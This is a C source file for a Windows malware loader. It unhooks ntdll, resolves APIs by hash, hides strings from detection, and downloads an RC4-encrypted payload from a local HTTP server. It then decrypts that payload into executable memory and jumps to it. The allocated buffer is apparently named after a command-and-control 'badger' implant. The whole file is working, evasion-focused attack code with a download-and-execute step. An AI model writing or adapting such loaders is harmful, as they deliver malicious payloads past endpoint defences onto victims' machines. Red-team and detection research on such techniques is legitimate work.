#include <stdio.h>
#include <Windows.h>
#include <amsi.h>
#include <Wininet.h>
#include <wchar.h>

#include "HellsHall.h"
#include "Core.h"
#include "Structs.h"
#include "ApiHashing.h"


BOOL Run()
{

	HMODULE hNtdllBase = GetModuleHandleH(0x1C8BDEBA);
	if (!UnhookNtdllFromDisk(hNtdllBase)) {
		return FALSE;
	}

	wchar_t sWinInet[] = {L'W', L'I', L'N', L'I', L'N', L'E', L'T', L'.', L'D', L'L', L'L', L'\0'};
	if (LdrLoadDll(sWinInet) == NULL) { 
		return FALSE;
	}

	//LPCWSTR url = L"http://127.0.0.1:8888/rc4.bin";
	wchar_t url[] = { L'h', L't', L't', L'p', L':', L'/', L'/', L'1', L'2', L'7', L'.', L'0', L'.', L'0', L'.', L'1', L':', L'8', L'8', L'8', L'8', L'/', L'r', L'c', L'4', L'.', L'b', L'i', L'n', L'\0' };

	PBYTE pFileBuffer = NULL;
	DWORD dwFileSize = 0;
	if (!FetchFileFromURLW(url, &pFileBuffer, &dwFileSize)) {
		return FALSE;
	}

	fnNtAllocateVirtualMemory pNtAllocateVirtualMemory = (fnNtAllocateVirtualMemory)GetProcAddressH(hNtdllBase, 0x498165AA);
	if (!pNtAllocateVirtualMemory) {
		return FALSE;
	}

	HMODULE hKernel32Base = GetModuleHandleH(0x377D97D5);
	fnGetCurrentProcess pGetCurrentProcess = (fnGetCurrentProcess)GetProcAddressH(hKernel32Base, 0x36A1243A);

	PVOID pBadger = NULL;
	SIZE_T regionSize = dwFileSize;

	pNtAllocateVirtualMemory(pGetCurrentProcess(), &pBadger, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	if (pBadger) {
		_memcpy(pBadger, pFileBuffer, dwFileSize);
		unsigned char Rc4Key[] = { 0x39, 0x4D, 0x1C, 0x3B, 0x28, 0xB1, 0x9C, 0xFA, 0x72, 0x81, 0x60, 0x4F, 0xCA, 0xB5, 0x51, 0x17 }; 
		if (!Rc4EncryptionViSystemFunc032(Rc4Key, pBadger, sizeof(Rc4Key), dwFileSize)) {
			return FALSE;
		}

		jmpExec(pBadger);

	}

	fnHeapFree pHeapFree = (fnHeapFree)GetProcAddressH(hKernel32Base, 0xD7287467);
	fnGetProcessHeap pGetProcessHeap = (fnGetProcessHeap)GetProcAddressH(hKernel32Base, 0xF4F1E4B7);
	pHeapFree(pGetProcessHeap(), 0, pFileBuffer);

	return TRUE;

}